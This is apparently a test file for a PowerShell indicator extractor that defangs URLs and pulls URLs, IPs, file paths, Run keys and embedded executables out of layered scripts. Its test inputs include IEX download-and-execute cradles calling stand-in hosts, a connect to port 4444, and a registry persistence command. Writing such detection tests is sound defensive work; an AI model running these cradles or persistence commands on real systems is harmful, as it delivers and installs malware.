import { describe, expect, it } from 'vitest';

import { analyze } from '../../analyze';
import { defang, refang } from '../defang';

const kinds = (r: Awaited<ReturnType<typeof analyze>>, kind: string): string[] =>
  r.iocs.indicators.filter((i) => i.kind === kind).map((i) => i.value);

describe('defanging', () => {
  it('neutralises a URL for safe pasting', () => {
    expect(defang('http://evil.test/a.ps1')).toBe('hxxp://evil[.]test/a[.]ps1');
  });

  it('round-trips', () => {
    const url = 'https://evil.test/payload.exe';
    expect(refang(defang(url))).toBe(url);
  });
});

describe('URL extraction', () => {
  it('finds a download URL', async () => {
    const r = await analyze(`IEX (New-Object Net.WebClient).DownloadString('http://evil.test/a.ps1')`);
    expect(kinds(r, 'url')).toContain('http://evil.test/a.ps1');
  });

  it('trims trailing punctuation', async () => {
    const r = await analyze(`Write-Host "see http://evil.test/a.ps1."`);
    expect(kinds(r, 'url')).toContain('http://evil.test/a.ps1');
  });

  it('ignores schema hosts that are scaffolding, not targets', async () => {
    const r = await analyze(`Write-Host "http://schemas.microsoft.com/foo"`);
    expect(kinds(r, 'url')).toHaveLength(0);
  });
});

describe('IP extraction', () => {
  it('finds a dotted quad', async () => {
    const r = await analyze(`$c.Connect('192.168.10.55', 4444)`);
    expect(kinds(r, 'ipv4')).toContain('192.168.10.55');
  });

  // Bounding each octet is what stops version strings matching.
  it('rejects out-of-range octets', async () => {
    const r = await analyze(`Write-Host "version 1.2.300.4"`);
    expect(kinds(r, 'ipv4')).toHaveLength(0);
  });

  it('rejects 0.x and the broadcast address', async () => {
    const r = await analyze(`Write-Host "0.0.0.0 255.255.255.255"`);
    expect(kinds(r, 'ipv4')).toHaveLength(0);
  });
});

describe('path and registry extraction', () => {
  it('finds a drive path', async () => {
    const r = await analyze(String.raw`Start-Process "C:\Users\Public\svc.exe"`);
    expect(kinds(r, 'filepath').some((p) => p.includes('svc.exe'))).toBe(true);
  });

  it('finds an environment-relative path', async () => {
    const r = await analyze(String.raw`$p = "%APPDATA%\update.exe"`);
    expect(kinds(r, 'filepath').some((p) => p.includes('update.exe'))).toBe(true);
  });

  it('finds a Run key', async () => {
    const r = await analyze(
      String.raw`Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name x -Value y`,
    );
    expect(kinds(r, 'registry').some((k) => /Run/i.test(k))).toBe(true);
  });
});

describe('embedded PE detection', () => {
  it('flags a base64 MZ header', async () => {
    const pe = `TVqQAAMAAAAEAAAA${'A'.repeat(120)}`;
    const r = await analyze(`$b = [Convert]::FromBase64String('${pe}')`);
    expect(r.iocs.hasEmbeddedPe).toBe(true);
  });

  it('does not flag ordinary base64', async () => {
    const r = await analyze(`$b = [Convert]::FromBase64String('${'Q'.repeat(140)}')`);
    expect(r.iocs.hasEmbeddedPe).toBe(false);
  });
});

describe('indicators are found across layers, not just the final stage', () => {
  // This is what makes the tool useful below full deobfuscation coverage: a
  // partial unwrap still surfaces the stage-2 URL.
  it('harvests from an intermediate layer', async () => {
    const inner = `IEX (New-Object Net.WebClient).DownloadString('http://stage2.test/b.ps1')`;
    const r = await analyze(`IEX ('${inner.replace(/'/g, "''")}')`);
    expect(kinds(r, 'url')).toContain('http://stage2.test/b.ps1');
    expect(r.layers.length).toBeGreaterThan(1);
  });

  it('reports the earliest layer an indicator appeared in', async () => {
    const r = await analyze(`IEX (New-Object Net.WebClient).DownloadString('http://evil.test/a')`);
    const url = r.iocs.indicators.find((i) => i.kind === 'url');
    expect(url?.layer).toBe(0);
  });
});
